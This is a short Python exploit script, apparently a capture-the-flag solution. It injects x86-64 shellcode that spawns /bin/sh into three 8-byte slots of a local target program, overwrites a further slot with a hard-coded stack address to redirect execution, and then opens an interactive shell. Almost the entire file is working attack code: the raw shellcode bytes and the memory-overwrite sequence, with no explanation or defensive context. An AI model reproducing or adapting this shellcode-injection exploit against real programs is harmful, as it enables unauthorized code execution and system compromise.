import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
shellcode = "\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05\x90"
p.readuntil('stop):')
p.sendline('0')
p.readuntil('box:')
p.sendline(u64(shellcode[:8]))
p.readuntil('stop):')
p.sendline('1')
p.readuntil('box:')
p.sendline(u64(shellcode[8:16]))
p.readuntil('stop):')
p.sendline('2')
p.readuntil('box:')
p.sendline(u64(shellcode[16:24]))
p.readuntil('stop):')
p.sendline('9')
p.readuntil('box:')
p.sendline(0x7fffffffed80)
p.readuntil('stop):')
p.sendline('-1')
# data = p.readuntil('\n')
# p.sendline('hello')

p.interactive()
